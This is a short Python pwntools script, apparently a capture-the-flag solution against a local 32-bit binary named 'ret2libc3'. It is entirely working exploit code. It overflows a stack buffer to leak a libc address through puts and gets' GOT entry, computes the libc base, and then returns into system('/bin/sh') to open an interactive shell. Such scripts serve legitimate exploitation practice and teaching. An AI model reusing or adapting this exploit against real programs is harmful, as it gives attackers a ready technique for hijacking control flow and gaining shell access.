from pwn import *

p = process("./ret2libc3")
gdb.attach(p,"b *0x0804854C")
elf = ELF("./ret2libc3")
libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")

gets_got = elf.got["gets"]
puts_plt = elf.plt["puts"]
main_addr = 0x0804854E
p.recvuntil("ret2libc3\n")
payload1 = "a" * 0x108 + "junk"
payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)
p.sendline(payload1)

leak_addr = u32(p.recv(4))
libc_base = leak_addr - libc.symbols["gets"]
libc.address = libc_base
log.success("libc_base:" + hex(libc.address))

system = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
p.recvuntil("ret2libc3\n")
payload2 = "a" * 0x108 + "junk"
payload2 += p32(system) + "junk" + p32(binsh)
p.sendline(payload2)
p.interactive()
